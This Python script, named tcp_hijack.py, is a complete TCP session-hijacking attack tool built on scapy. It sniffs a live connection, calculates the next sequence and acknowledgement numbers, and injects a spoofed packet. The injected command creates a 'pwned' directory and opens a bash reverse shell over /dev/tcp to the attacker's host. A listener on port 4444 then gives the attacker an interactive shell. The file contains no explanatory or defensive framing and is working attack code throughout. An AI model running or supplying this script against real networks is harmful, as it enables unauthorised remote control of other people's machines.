import sys
import time
import threading
import socket
from scapy.all import sniff, IP, TCP, Raw, send


def grab_packet(src_ip, dst_ip, dst_port, timeout=30):
    bpf = f"tcp and src host {src_ip} and dst host {dst_ip} and dst port {dst_port}"
    print("waiting for packet...")
    pkts = sniff(filter=bpf, count=1, timeout=timeout)
    if not pkts:
        sys.exit("Timeout waiting for packet")
    return pkts[0]


def inject_payload(src_ip, dst_ip, dst_port, sport, seq, ack, attacker_ip, attacker_port):
    payload = (
        "mkdir -p /home/user/pwned; "
        f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\n"
    )
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=sport, dport=dst_port, seq=seq, ack=ack, flags="PA")
    pkt = ip / tcp / Raw(load=payload)
    send(pkt, verbose=False)


def start_listener(port, result):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    conn, addr = srv.accept()
    print(f"Received reverse shell connection from {addr}")
    result['conn'] = conn


def interactive_shell(conn):
    conn.settimeout(1.0)
    try:
        while True:
            cmd = input("$ ")
            if not cmd:
                continue
            conn.sendall((cmd + "\n").encode())
            time.sleep(0.2)
            data = b""
            try:
                while True:
                    part = conn.recv(4096)
                    if not part:
                        break
                    data += part
            except socket.timeout:
                pass
            print(data.decode(errors="ignore"), end="")
    except (KeyboardInterrupt, BrokenPipeError):
        sys.exit(0)


def main():
    if len(sys.argv) != 4:
        print(f"Usage: python3 tcp_hijack.py <src_ip> <dst_ip> <dst_port>")
        sys.exit(1)

    src_ip, dst_ip, dst_port = sys.argv[1], sys.argv[2], int(sys.argv[3])
    attacker_ip = socket.gethostbyname(socket.gethostname())

    # Start listener
    result = {}
    listener = threading.Thread(target=start_listener, args=(
        4444, result), daemon=True)
    listener.start()
    time.sleep(1)

    sniffed_pkt = grab_packet(src_ip, dst_ip, dst_port)

    # Calculate seq/ack
    orig_seq = sniffed_pkt[TCP].seq
    payload_len = len(bytes(sniffed_pkt[TCP].payload))
    inject_seq = orig_seq + payload_len
    inject_ack = sniffed_pkt[TCP].ack

    # Inject mkdir + reverse shell
    inject_payload(src_ip, dst_ip, dst_port, sniffed_pkt[TCP].sport,
                   inject_seq, inject_ack, attacker_ip, 4444)

    # Wait for reverse shell and interact
    listener.join()
    conn = result.get('conn')
    if conn:
        interactive_shell(conn)
    else:
        sys.exit("Did not receive reverse shell connection")


if __name__ == "__main__":
    main()
